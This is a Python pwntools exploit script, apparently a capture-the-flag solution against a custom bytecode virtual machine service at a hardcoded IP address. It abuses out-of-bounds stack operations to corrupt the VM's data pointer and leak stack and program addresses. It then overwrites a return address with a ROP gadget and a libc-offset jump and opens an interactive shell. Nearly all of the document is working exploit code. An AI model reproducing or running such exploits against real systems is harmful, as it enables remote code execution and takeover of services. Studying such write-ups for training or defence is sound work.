from pwn import *

bytecode = ""

def NOOP():
    global bytecode
    bytecode += p32(0)

def IADD():
    global bytecode
    bytecode += p32(1)

def ISUB():
    global bytecode
    bytecode += p32(2)

def IMUL():
    global bytecode
    bytecode += p32(3)

def ILT():
    global bytecode
    bytecode += p32(4)

def IEQ():
    global bytecode
    bytecode += p32(5)

def BR(addr):
    global bytecode
    bytecode += p32(6)
    bytecode += p32(addr)

def BRT(addr):
    global bytecode
    bytecode += p32(7)
    bytecode += p32(addr)

def BRF(addr):
    global bytecode
    bytecode += p32(8)
    bytecode += p32(addr)

def ICONST(val):
    global bytecode
    bytecode += p32(9)
    bytecode += p32(val)

def LOAD(idx):
    global bytecode
    bytecode += p32(10)
    bytecode += p32(idx)

def GLOAD(idx):
    global bytecode
    bytecode += p32(11)
    bytecode += p32(idx)

def STORE(idx):
    global bytecode
    bytecode += p32(12)
    bytecode += p32(idx)

def GSTORE(idx):
    global bytecode
    bytecode += p32(13)
    bytecode += p32(idx)

def PRINT():
    global bytecode
    bytecode += p32(14)
    
def POP():
    global bytecode
    bytecode += p32(15)    

def CALL(call_address, locals_count, unused ):
    global bytecode
    bytecode += p32(16)
    bytecode += p32(call_address)
    bytecode += p32(locals_count)
    bytecode += p32(unused)

def RET():
    global bytecode
    bytecode += p32(17)

def HALT():
    global bytecode
    bytecode += p32(18)

def pad_bytecode():
    global bytecode
    needed = 128 * 4
    while(len(bytecode) < needed):
        NOOP()


# shift ptr to pBytecode end
POP()
POP()
POP()
POP()
POP()
#PRINT()
#PRINT()
# now corrupt data pointer
STORE(1) # record that pointer
STORE(0) 
LOAD(0) # restore bytecode ptr
LOAD(1) # 
ICONST(0x80)# opcode count
ICONST(0x0) # pad
#ICONST(0x41414141)
#ICONST(0x41414142)
LOAD(0)
LOAD(1)
LOAD(0)
ICONST(0x28) # sub to ret addr
ISUB()
#store result 
#PRINT()
#HALT()
#POP()
STORE(2)
POP()
POP()
#POP()
LOAD(2)
LOAD(1)
PRINT()
PRINT()
LOAD(2)
LOAD(1)
#ICONST(0x1)
#ICONST(0x2)

# pad the stack a bit
ICONST(0)
ICONST(0)
ICONST(0)
ICONST(0)
ICONST(0)
# calculate main addr
#ICONST(0xdeadbeef)
#main 0x559390a8ac7b
#ret  0x559390a8ad5d
GLOAD(0)
ICONST(0xe2)
ISUB()
GSTORE(0)

#ICONST(0xfeedface)
#GSTORE(0)
#GSTORE(1)
print(len(bytecode))
GLOAD(0)
GLOAD(1)
PRINT()
PRINT()
for i in range(28):
    ICONST(0x41414242) # force printf flush

HALT()



#r = remote("172.17.0.2",1337)
r = remote("47.243.140.252", 1337)



pause()


pad_bytecode()
r.send(bytecode)
import ctypes

r.recvuntil("print               ")
hi_part = r.recvline().rstrip()
r.recvuntil("print               ")
lo_part = r.recvline().rstrip()


stack_ptr = int(hi_part) << 32 | ctypes.c_uint32(int(lo_part)).value
log.info("stack : "+hex(stack_ptr))

r.recvuntil("print               ")
hi_part = r.recvline().rstrip()
r.recvuntil("print               ")
lo_part = r.recvline().rstrip()


main_addr = int(hi_part) << 32 | ctypes.c_uint32(int(lo_part)).value
pie_base = main_addr - 0x1c7b
bss = pie_base + 0x4000
std_err_ptr = bss + 0x120

log.info("main @ "+hex(main_addr))
log.info("PIE @ "+hex(pie_base))
#r.interactive()


def split_uint64(u64):
    return u64 & 0xffffffff, u64 >> 32

log.info("stderr @ "+hex(std_err_ptr))
bytecode = ""
# read stderr ptr and do the same thing over again
POP()
POP()
POP()

lo,hi = split_uint64(std_err_ptr)
ICONST(lo)
ICONST(hi)

#ICONST(0) # pad
#ICONST(0) # pad
GLOAD(0)
STORE(0) # ptr lo
GLOAD(1)
STORE(1) # ptr hi

# stderr ptr in 
LOAD(0)
PRINT()
LOAD(1)
PRINT()

LOAD(0)
ICONST(0x105942) # add/sub
ISUB()
STORE(2)


POP()
POP()
pop_regs = pie_base + 0x0000000000001dec  #pop r12; pop r13; pop r14; pop r15; ret;
p_ret_addr = stack_ptr + 0x8

lo,hi = split_uint64(p_ret_addr)
ICONST(lo)
ICONST(hi) #data pointer

lo,hi = split_uint64(pop_regs)
ICONST(lo) # pop regs
GSTORE(0)
ICONST(hi)
GSTORE(1)
ICONST(0)  # r12
GSTORE(2)
ICONST(0)  # r12
GSTORE(3)
# 4 - 5 = r13
# 6 - 7 = r14
ICONST(0) # r15
GSTORE(8) # 
ICONST(0) # r15
GSTORE(9)

LOAD(2) # ret lo
GSTORE(10) 
LOAD(1) # ret hi
GSTORE(11)
#, 0x105942, 0x10593f, 0xe6c84
#GSTORE(0)
POP()
POP()
ICONST(0)
ICONST(0)
ICONST(0)


#ICONST(0x1)
#LOAD(2)
#ICONST(0x2)
#GSTORE(0)



#0x1ec5c0

HALT()
pad_bytecode()
r.send(bytecode)
r.interactive(0)

